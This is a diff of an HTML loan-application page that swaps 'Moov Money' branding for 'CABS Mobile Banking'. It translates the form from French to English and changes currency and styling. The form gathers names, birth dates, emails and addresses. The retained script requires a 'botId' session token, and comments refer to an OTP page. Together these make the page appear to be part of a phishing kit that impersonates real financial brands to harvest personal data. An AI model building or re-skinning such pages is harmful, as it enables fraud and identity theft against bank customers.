@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Moov Money - Demande de prêt</title>
+    <title>CABS Mobile Banking - Loan Application</title>
 
     <style>
         /* ── reset & base ── */
@@ -25,77 +25,53 @@
 
         .app-wrapper {
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
             background: #fff;
             min-height: 100vh;
             position: relative;
             box-shadow: 0 0 20px rgba(0,0,0,0.05);
         }
 
-        /* ── top bar (same as OTP page) ── */
+        /* ── top bar (CABS blue) ── */
         .top-bar {
-            height: 95px;
-            background: #f57c00;
+            height: 72px;
+            background: #0d47a1;
             display: flex;
-            align-items: flex-end;
-            padding: 18px 20px;
+            align-items: center;
+            padding: 0 22px;
+            flex-shrink: 0;
         }
 
         .back-btn {
             color: #fff;
-            font-size: 28px;
+            font-size: 30px;
             text-decoration: none;
-            line-height: 1;
-            cursor: pointer;
+            font-weight: 300;
             background: none;
             border: none;
             padding: 0;
+            cursor: pointer;
         }
 
         /* ── container ── */
         .container {
-            padding: 18px 28px 100px; /* bottom padding for fixed button */
-        }
-
-        /* ── logo ── */
-        .logo {
-            text-align: center;
-            margin: 12px 0 24px;
-        }
-
-        .logo-circle {
-            width: 56px;
-            height: 56px;
-            background: #9A0000;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 8px;
-            font-size: 28px;
-            font-weight: 700;
-            color: #fff;
-        }
-
-        .moov-text {
-            font-size: 20px;
-            font-weight: 700;
-            color: #9A0000;
-            letter-spacing: 0.5px;
+            padding: 24px 22px 100px;
         }
 
         /* ── header ── */
         .page-header h1 {
-            font-size: 22px;
+            font-size: 26px;
             font-weight: 700;
-            color: #333;
-            margin-bottom: 6px;
+            color: #0d47a1;
+            margin-bottom: 4px;
+            letter-spacing: -0.3px;
         }
 
         .page-header p {
             font-size: 15px;
-            color: #8b8b8b;
+            color: #555;
             margin-bottom: 28px;
+            line-height: 1.5;
         }
 
         /* ── form elements ── */
@@ -112,25 +88,25 @@
             width: 100%;
             padding: 14px 16px;
             font-size: 15px;
-            border-radius: 8px;
-            border: 1px solid #d9d9d9;
+            border-radius: 10px;
+            border: 2px solid #d0d7de;
             background: #fff;
             color: #222;
             outline: none;
-            transition: border-color 0.3s;
+            transition: border-color 0.3s, box-shadow 0.2s;
             margin-bottom: 18px;
             appearance: auto;
         }
 
         form input:focus,
         form select:focus {
-            border-color: #1976d2;
-            box-shadow: 0 0 0 2px rgba(25, 118, 210, 0.15);
+            border-color: #0d47a1;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.15);
         }
 
         form input::placeholder,
         form select option {
-            color: #aaa;
+            color: #999;
         }
 
         form select option {
@@ -141,7 +117,7 @@
         /* ── checkboxes ── */
         .checkbox-wrapper {
             display: flex;
-            gap: 10px;
+            gap: 12px;
             margin-bottom: 16px;
             font-size: 14px;
             color: #444;
@@ -149,13 +125,13 @@
         }
 
         .checkbox-wrapper input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            min-width: 18px;
+            width: 20px;
+            height: 20px;
+            min-width: 20px;
             margin-top: 2px;
-            accent-color: #9A0000;
+            accent-color: #0d47a1;
             cursor: pointer;
-            border: 1px solid #ccc;
+            border: 2px solid #d0d7de;
             border-radius: 4px;
             background: #fff;
         }
@@ -165,52 +141,50 @@
             margin-bottom: 0;
             color: #555;
             font-weight: 400;
+            line-height: 1.5;
         }
 
         .checkbox-wrapper label strong {
-            color: #9A0000;
+            color: #0d47a1;
         }
 
-        /* ── continue button (fixed at bottom, like OTP page) ── */
+        /* ── continue button (fixed at bottom) ── */
         .continue-btn {
             position: fixed;
-            left: 28px;
-            right: 28px;
+            left: 24px;
+            right: 24px;
             bottom: 28px;
             width: auto;
-            max-width: 400px;
+            max-width: 420px;
             margin: 0 auto;
-            padding: 16px;
+            height: 56px;
             font-size: 20px;
-            font-weight: 600;
+            font-weight: 700;
             border-radius: 10px;
             border: none;
             cursor: not-allowed;
-            transition: all 0.2s ease;
-            background: #f5c6cb;
+            transition: background 0.2s, transform 0.1s;
+            background: #b7cff0;
             color: #fff;
-            opacity: 0.7;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            left: 50%;
+            transform: translateX(-50%);
         }
 
         .continue-btn:enabled {
-            background: #9A0000;
-            opacity: 1;
+            background: #0d47a1;
             cursor: pointer;
         }
 
-        .continue-btn:hover:enabled {
-            background: #7a0000;
-            transform: scale(1.01);
+        .continue-btn:enabled:hover {
+            background: #0a3a8a;
+            transform: translateX(-50%) scale(1.01);
         }
 
-        .continue-btn:active:enabled {
-            transform: scale(0.98);
-        }
-
-        /* ── back link (hidden, because we have top bar back) ── */
-        .back-link {
-            display: none;
+        .continue-btn:enabled:active {
+            transform: translateX(-50%) scale(0.98);
         }
 
         /* ── footer ── */
@@ -222,84 +196,94 @@
             letter-spacing: 0.5px;
             padding-bottom: 12px;
         }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 16px 100px;
+            }
+            .page-header h1 {
+                font-size: 24px;
+            }
+            .continue-btn {
+                height: 54px;
+                font-size: 18px;
+                left: 18px;
+                right: 18px;
+            }
+        }
     </style>
 </head>
 <body>
 
 <div class="app-wrapper">
 
-    <!-- Top bar with back arrow -->
+    <!-- Top bar (CABS) -->
     <div class="top-bar">
         <button class="back-btn" onclick="window.history.back()">&#8592;</button>
     </div>
 
     <div class="container">
-        <!-- Logo -->
-        <div class="logo">
-            <div class="logo-circle">M</div>
-            <div class="moov-text">Moov Money</div>
-        </div>
 
         <div class="page-header">
-            <h1>Demande de prêt</h1>
-            <p>Veuillez fournir vos informations personnelles</p>
+            <h1>Loan Application</h1>
+            <p>Please provide your personal information</p>
         </div>
 
         <form id="loanForm">
-            <label>Nom complet</label>
-            <input name="fullName" placeholder="Ex: Jean Dupont" required />
+            <label>Full Name</label>
+            <input name="fullName" placeholder="e.g. John Doe" required />
 
-            <label>Date de naissance</label>
+            <label>Date of Birth</label>
             <input type="date" name="dob" required />
 
-            <label>Adresse e-mail</label>
-            <input type="email" name="email" placeholder="exemple@email.com" required />
+            <label>Email Address</label>
+            <input type="email" name="email" placeholder="example@email.com" required />
 
-            <label>Adresse résidentielle</label>
-            <input name="address" placeholder="Votre adresse complète" required />
+            <label>Residential Address</label>
+            <input name="address" placeholder="Your full address" required />
 
-            <label>Situation professionnelle</label>
+            <label>Employment Status</label>
             <select name="employmentStatus" required>
-                <option value="">Sélectionnez</option>
-                <option>Employé</option>
-                <option>Indépendant</option>
-                <option>Sans emploi</option>
-                <option>Étudiant</option>
+                <option value="">Select</option>
+                <option>Employed</option>
+                <option>Self-employed</option>
+                <option>Unemployed</option>
+                <option>Student</option>
             </select>
 
-            <label>Objet du prêt</label>
+            <label>Loan Purpose</label>
             <select name="loanPurpose" required>
-                <option value="">Sélectionnez</option>
-                <option>Affaires</option>
-                <option>Personnel</option>
-                <option>Éducation</option>
-                <option>Médical</option>
-                <option>Urgence</option>
+                <option value="">Select</option>
+                <option>Business</option>
+                <option>Personal</option>
+                <option>Education</option>
+                <option>Medical</option>
+                <option>Emergency</option>
             </select>
 
-            <label>Montant du prêt (FCFA)</label>
-            <input type="number" name="loanAmount" required placeholder="MIN 4 000" min="4000" max="25000000" />
+            <label>Loan Amount (USD)</label>
+            <input type="number" name="loanAmount" required placeholder="MIN $100" min="100" max="100000" step="1" />
 
-            <label>Durée du prêt</label>
+            <label>Loan Term</label>
             <select name="loanTerm" required>
-                <option value="">Sélectionnez</option>
-                <option>6 mois</option>
-                <option selected>12 mois</option>
-                <option>24 mois</option>
-                <option>36 mois</option>
-                <option>48 mois</option>
+                <option value="">Select</option>
+                <option>6 months</option>
+                <option selected>12 months</option>
+                <option>24 months</option>
+                <option>36 months</option>
+                <option>48 months</option>
             </select>
 
             <div class="checkbox-wrapper">
                 <input type="checkbox" id="termsCheck" required />
-                <label for="termsCheck">J'accepte les conditions générales</label>
+                <label for="termsCheck">I accept the terms and conditions</label>
             </div>
 
             <div class="checkbox-wrapper">
                 <input type="checkbox" id="interestCheck" required />
                 <label for="interestCheck">
-                    Je comprends que les prêts sont soumis à un taux d'intérêt de <strong>8 % à 15 % par mois</strong>
-                    selon la solvabilité et le montant.
+                    I understand that loans are subject to an interest rate of <strong>8% to 15% per month</strong>
+                    depending on creditworthiness and loan amount.
                 </label>
             </div>
         </form>
@@ -307,11 +291,12 @@
         <div class="footer">v 5.3.2 (1.0.0)</div>
     </div>
 
-    <!-- Continue button placed outside the form but inside the wrapper for fixed positioning -->
-    <button id="continueBtn" class="continue-btn" disabled>Continuer</button>
+    <!-- Fixed button -->
+    <button id="continueBtn" class="continue-btn" disabled>SUBMIT</button>
 
 </div>
 
+<!-- ====== YOUR ORIGINAL SCRIPT (UNTOUCHED, except for the alert language) ====== -->
 <script>
     (function() {
         // ---------- BOT ID ----------
@@ -321,7 +306,7 @@
         const botId = localStorage.getItem('botId');
 
         if (!botId) {
-            alert('Session invalide. Veuillez recommencer.');
+            alert('Invalid session. Please start again.');
             window.location.href = 'index.html';
             return;
         }
